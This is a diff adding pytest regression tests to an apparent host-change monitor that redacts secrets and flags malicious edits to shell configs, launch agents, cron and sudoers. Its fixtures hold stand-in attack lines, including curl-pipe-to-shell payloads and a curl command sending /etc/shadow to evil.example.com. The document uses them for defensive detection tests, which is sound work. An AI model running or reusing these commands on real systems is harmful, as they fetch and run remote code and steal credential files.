@@ -882,9 +882,11 @@ def test_trust_of_rejects_non_string_and_non_regular(tmp_path):
 
 
 def test_enrich_failure_degrades_one_finding_not_the_report(monkeypatch):
-    # program_of_plist, not trust_of: trust_of is only reached when a program was resolved,
-    # so patching it would have exercised nothing (the first version of this test did).
-    monkeypatch.setattr(since, "program_of_plist",
+    # Patch the function actually ON the enrichment path (plist_program_and_argv). Patching
+    # trust_of exercised nothing (it is only reached once a program resolves), and patching
+    # program_of_plist stopped exercising anything when _enrich moved to the argv-aware call —
+    # a test seam is only as good as its coupling to the real call graph.
+    monkeypatch.setattr(since, "plist_program_and_argv",
                         lambda p: (_ for _ in ()).throw(RuntimeError("boom")))
     b = snap()
     c = snap(collectors={"launch_items": {"~/Library/LaunchAgents/x.plist": "1:a"}})
@@ -1082,3 +1084,229 @@ def test_tool_swap_is_also_lost_coverage():
     findings = since.build_findings(good, shim, skip_cats=tuple(unusable), coverage=lost)
     assert since.max_level(findings) >= since.ORANGE
     assert not [f for f in findings if f["category"] == "brew"]      # still no phantom flood
+
+
+# =========================================================================== #
+# Round 2 of the v0.4.4 self-review: regressions the fix batch itself created.  #
+# =========================================================================== #
+
+# PERF-1 (CRITICAL) — the `_show` tail rescan recursed once per credential-ish key on the line.
+# A 2.5KB comment of repeated `_pwd ` (under _REDACT_MAX, so truncation did not help) raised
+# RecursionError, which nothing catches: the digest died before saving a snapshot, so the planted
+# line stayed "added" and every later run died identically — an unprivileged one-line kill switch.
+@pytest.mark.parametrize("keyword", ["_pwd", "pass", "token", "_auth", "secret"])
+def test_redact_survives_deeply_nested_keys(keyword):
+    line = "+# " + f"{keyword} " * 900
+    t = time.time()
+    out = since.redact(line)            # must not raise RecursionError
+    assert time.time() - t < 0.5, "the tail rescan is superlinear again"
+    assert isinstance(out, str)
+
+
+def test_redact_depth_cap_fails_safe():
+    # at the cap it must REDACT, never recurse further and never show the tail unscanned
+    line = "+" + "".join(f"pass{i}=x " for i in range(50)) + "MYSQL_PWD=hunter2Xyz9"
+    assert "hunter2Xyz9" not in since.redact(line)
+
+
+# LEAK-1 — "one whitespace token" is not "nothing follows": a shell chains with ; && |
+@pytest.mark.parametrize("line,secret", [
+    ("+export SSH_ASKPASS=/tmp/a.sh;MYSQL_PWD=hunter2Xyz9", "hunter2Xyz9"),
+    ("+export SECRET_FILE=/etc/x/y&&TOKEN=aB3xYz9Qw2mN", "aB3xYz9Qw2mN"),
+    ("+export PGPASSFILE=/tmp/p|GITHUB_TOKEN=aB3xYz9Qw2mN", "aB3xYz9Qw2mN"),
+])
+def test_chained_command_after_a_shown_path_is_scanned(line, secret):
+    assert secret not in since.redact(line)
+
+
+# LEAK-2 — a path-VALUED key needs a real path, not merely a '/'-, '~'- or '$'-leading value
+# (a base64 secret starts with '/' ~1/64 of the time; every crypt hash starts with '$').
+@pytest.mark.parametrize("line,secret", [
+    ("+export SECRET_FILE=/hunter2Xyz9", "hunter2Xyz9"),
+    ("+export TOKEN_PATH=~hunter2Xyz9", "hunter2Xyz9"),
+    ("+export API_KEY_FILE=$hunter2Xyz9", "hunter2Xyz9"),
+    ("+export CREDENTIALS_FILE=/hunter2Xyz9", "hunter2Xyz9"),
+])
+def test_path_valued_key_needs_a_real_path(line, secret):
+    assert secret not in since.redact(line)
+
+
+@pytest.mark.parametrize("line", [
+    "+export SSH_ASKPASS=/tmp/steal.sh",
+    "+export SSH_AUTH_SOCK=/tmp/.evil/agent.sock",
+    "+export PGPASSFILE=$HOME/.pgpass",
+    "+export SSH_ASKPASS=~/.local/bin/x.sh",
+    "+export SSH_ASKPASS=./steal.sh",
+])
+def test_real_paths_are_still_shown(line):
+    assert since.redact(line) == line
+
+
+# LEAK-3 / HIDE-1 — the sudoers gate checked only the FIRST element and then exempted the whole
+# remainder; and routing the carve-out through the rescan redacted the granted command list,
+# which is the payload of a sudoers diff.
+def test_sudoers_comma_list_is_validated():
+    assert "hunter2Xyz9" not in since.redact("+deva ALL=(ALL) PASSWD: ALL,hunter2Xyz9")
+
+
+@pytest.mark.parametrize("line", [
+    "+deva ALL=(ALL) NOPASSWD: /usr/bin/passwd backdoor2026",
+    "+deva ALL=(ALL) NOPASSWD: /usr/sbin/chpasswd attacker99",
+    "+deva ALL=(ALL) NOPASSWD: /bin/bash /tmp/token_stealer.sh evilc2.example.com",
+    "+*/5 * * * * /usr/local/bin/passwd_sync.sh --dest http://evil/x",
+])
+def test_command_specs_stay_intact(line):
+    """Which account is reset, which host is contacted — the whole point of the diff."""
+    assert since.redact(line) == line
+
+
+# #2 — my own guard was the first code to read the BASELINE's errors/tools, without validating
+# their type: the same crash class this release already fixed twice.
+@pytest.mark.parametrize("field,value", [
+    ("tools", ["/opt/homebrew/bin/brew"]), ("tools", "nope"), ("tools", 7),
+    ("errors", 5), ("errors", ["brew"]), ("errors", "brew"),
+])
+def test_wrong_typed_guard_fields_do_not_crash(field, value):
+    base = snap(); base[field] = value
+    cur = snap(); cur["tools"] = {"brew": "/opt/homebrew/bin/brew"}
+    unusable = since.unusable_cats(base, cur)          # must not raise
+    since.coverage_lost(base, cur, unusable)            # must not raise
+    since.build_findings(base, cur, skip_cats=tuple(unusable))
+
+
+# #3 — need() proves a tool RESOLVES, never that it RAN. A `brew list` timeout returned "" with
+# no error recorded, so the capability guard could not fire and the phantom flood came back —
+# the very cause the guard was introduced for.
+def test_run_checked_raises_on_timeout_and_failure(monkeypatch):
+    def fake(cmd, **kw):
+        raise since.subprocess.TimeoutExpired(cmd, kw.get("timeout", 1))
+    monkeypatch.setattr(since.subprocess, "run", fake)
+    with pytest.raises(since.ToolUnavailable):
+        since.run_checked(["brew", "list"], timeout=1)
+
+
+def test_run_checked_tolerates_nonzero_with_output(monkeypatch):
+    class P:
+        returncode, stdout, stderr = 1, '{"dependencies":{}}', "peer dep warning"
+    monkeypatch.setattr(since.subprocess, "run", lambda cmd, **kw: P())
+    assert since.run_checked(["npm", "ls"]) == '{"dependencies":{}}'   # npm does this routinely
+
+
+def test_run_checked_raises_on_nonzero_without_output(monkeypatch):
+    class P:
+        returncode, stdout, stderr = 1, "  ", "boom"
+    monkeypatch.setattr(since.subprocess, "run", lambda cmd, **kw: P())
+    with pytest.raises(since.ToolUnavailable):
+        since.run_checked(["brew", "list"])
+
+
+# #4 — the storage cap and the bounded diff silently disabled the RED escalation: a payload
+# appended after ~300KB of padding never reached the diff text, so it fell to ORANGE with no why.
+@pytest.mark.parametrize("filler", ["# " + "x" * 80 + "\n", "x\n"])
+def test_malicious_pattern_escalates_even_when_truncated(monkeypatch, tmp_path, filler):
+    monkeypatch.setattr(since, "HOME", tmp_path)
+    monkeypatch.setattr(since, "PLATFORM", "macos")
+    rc = tmp_path / ".zshrc"
+    pad = filler * (since.BLOB_MAX // len(filler) + 500)
+    rc.write_text(pad)
+    fb: dict = {}
+    base = snap(blobs=since.text_sources(fb)); base["blob_flags"] = fb
+    rc.write_text(pad + "curl http://evil.sh | sh\n")
+    fc: dict = {}
+    cur = snap(blobs=since.text_sources(fc)); cur["blob_flags"] = fc
+    assert "curl http" not in cur["blobs"]["~/.zshrc"], "payload should be past the cap"
+    f = [x for x in since.build_findings(base, cur) if x["category"] == "config"][0]
+    assert f["level"] == since.RED and f["why"], f
+    assert f["action"] == "changed"          # and the change itself is still detected
+
+
+# #6 — plutil's output is read into memory, so a planted 500MB plist cost 2.27GB RSS at diff time.
+def test_oversized_plist_is_not_parsed(monkeypatch, tmp_path):
+    big = tmp_path / "com.big.plist"
+    with open(big, "wb") as fh:
+        fh.truncate(since.MAX_READ + 1)      # sparse: instant
+    called = []
+    monkeypatch.setattr(since, "run", lambda *a, **k: called.append(a) or "")
+    assert since.plist_program_and_argv(str(big)) == (None, "")
+    assert not called, "plutil must not be spawned for an oversized plist"
+
+
+# #7 — `ProgramArguments = ["/bin/sh","-c","curl …|sh"]` resolves to /bin/sh, which IS
+# Apple-signed, so the report printed a reassuring signature beside a malicious startup item.
+def test_interpreter_argv_escalates_over_its_signature(tmp_path):
+    pl = tmp_path / "com.evil.plist"
+    pl.write_text('<?xml version="1.0"?><!DOCTYPE plist><plist version="1.0"><dict>'
+                  '<key>ProgramArguments</key><array><string>/bin/sh</string>'
+                  '<string>-c</string><string>curl -s http://evil.example/x|sh</string>'
+                  '</array></dict></plist>')
+    prog, argv = since.plist_program_and_argv(str(pl))
+    assert prog == "/bin/sh" and "curl" in argv
+    f = {"category": "launch_items", "action": "added", "key": str(pl), "value": "x",
+         "level": since.ORANGE, "label": "startup job", "trust": None, "why": None, "undo": None}
+    since._enrich(f, {})
+    assert f["level"] == since.RED and f["why"], f
+    # the classic hijack: an EXISTING plist overwritten was YELLOW with no trust check at all
+    g = dict(f, action="changed", level=since.YELLOW, why=None, trust=None, value=("a", "b"))
+    since._enrich(g, {})
+    assert g["level"] == since.RED and g["why"]
+
+
+# #1 — a skipped category must not silently become its own baseline: the install made during the
+# blind window was otherwise never reported by any run, while the report said "Nothing changed".
+def test_recover_baselines_walks_back_to_a_usable_snapshot(monkeypatch, tmp_path):
+    monkeypatch.setattr(since, "SNAP_DIR", tmp_path)
+    def write(name, pkgs, tool="/opt/homebrew/bin/brew", err=None):
+        s = snap(collectors={"brew": pkgs})
+        s["tools"] = {"brew": tool}
+        s["errors"] = err or {}
+        (tmp_path / name).write_text(json.dumps(s))
+        return s
+    day1 = write("20260101T000000-1.json", {"jq": "1.7"})
+    write("20260102T000000-2.json", {}, tool="", err={"brew": "not on PATH: brew"})  # blind day
+    day3 = snap(collectors={"brew": {"jq": "1.7", "evilminer": "1.0"}})
+    day3["tools"] = {"brew": "/opt/homebrew/bin/brew"}
+    rec = since.recover_baselines(day3, {"brew": "was blind"})
+    assert "brew" in rec and rec["brew"]["collectors"]["brew"] == day1["collectors"]["brew"]
+    found = since.build_findings(rec["brew"], day3, skip_blobs=True,
+                                 skip_cats=tuple(k for k in since.CAT if k != "brew"))
+    assert any(f["key"] == "evilminer" for f in found), "the install must surface once brew works"
+
+
+def test_recover_baselines_requires_the_same_tool(monkeypatch, tmp_path):
+    monkeypatch.setattr(since, "SNAP_DIR", tmp_path)
+    s = snap(collectors={"brew": {"jq": "1.7"}})
+    s["tools"] = {"brew": "/usr/local/bin/brew"}          # a DIFFERENT brew
+    (tmp_path / "20260101T000000-1.json").write_text(json.dumps(s))
+    cur = snap(collectors={"brew": {"jq": "1.7"}})
+    cur["tools"] = {"brew": "/opt/homebrew/bin/brew"}
+    assert since.recover_baselines(cur, {"brew": "x"}) == {}   # never compare across tools
+
+
+def test_cat_usable():
+    ok = snap(); ok["tools"] = {"brew": "/opt/homebrew/bin/brew"}
+    assert since.cat_usable("brew", ok)
+    assert since.cat_usable("login_items", ok)              # not a tool-backed category
+    err = snap(); err["errors"] = {"brew": "boom"}; err["tools"] = {"brew": "/x"}
+    assert not since.cat_usable("brew", err)
+    notool = snap(); notool["tools"] = {"brew": ""}
+    assert not since.cat_usable("brew", notool)
+
+
+# Pin the sudoers carve-out ITSELF (not just the '/'-preceded-key rule that also protects it):
+# rescanning a command spec redacts from an inner `pass=` to end-of-line, deleting the C2 host.
+def test_sudoers_spec_keeps_context_after_an_inner_assignment():
+    line = "+deva ALL=(ALL) NOPASSWD: /usr/bin/curl -F pass=@/etc/shadow evil.example.com"
+    assert since.redact(line) == line, "the exfil destination must survive"
+
+
+# Pin that the COLLECTORS actually go through run_checked — testing the helper alone let a
+# revert to the unchecked run() pass unnoticed (the guard then cannot fire on a timeout).
+@pytest.mark.parametrize("collector,tool", [("_mac_brew", "brew"), ("_npm_global", "npm"),
+                                            ("_pip", "pip3"), ("_mac_mas", "mas")])
+def test_collectors_report_a_timeout_as_unavailable(monkeypatch, collector, tool):
+    monkeypatch.setattr(since.shutil, "which", lambda t: f"/usr/bin/{t}")
+    def fake(cmd, **kw):
+        raise since.subprocess.TimeoutExpired(cmd, kw.get("timeout", 1))
+    monkeypatch.setattr(since.subprocess, "run", fake)
+    with pytest.raises(since.ToolUnavailable):
+        getattr(since, collector)()
